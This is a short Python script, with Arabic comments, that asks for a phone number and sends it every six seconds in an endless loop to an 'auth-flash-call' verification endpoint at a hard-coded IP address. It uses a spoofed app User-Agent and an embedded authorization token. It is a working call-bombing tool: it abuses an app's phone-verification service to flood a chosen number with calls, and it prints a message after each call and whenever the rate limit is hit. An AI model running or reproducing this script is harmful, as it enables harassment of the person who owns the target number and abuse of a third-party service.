##HM
import requests
import json
import time

url = "https://31.171.171.90/api/phone-numbers/auth-flash-call"
phone_number = input("Enter Your Number (with +2): ")

headers = {
    'User-Agent': "okhttp/4.10.0",
    'Connection': "Keep-Alive",
    'Accept-Encoding': "gzip",
    'Content-Type': "application/json",
    'Authorization': "AzmJsc1Hs6w1ufp"
}

while True:
    payload = json.dumps({
        "phoneNumber": phone_number
    })

    response = requests.post(url, data=payload, headers=headers)

    # تحويل الاستجابة إلى JSON
    response_data = response.json()

    # التحقق من الاستجابة
    if response_data.get("allow") == True:
        print("Done, sent 1 call next in 6 sec")
    elif response_data.get("type") == "Error" and response_data.get("details") == "too many requests":
        print("Error: Call didnt sent (limit on number wait or come back again after 1 minutes)")
    else:
        pass

    time.sleep(6)
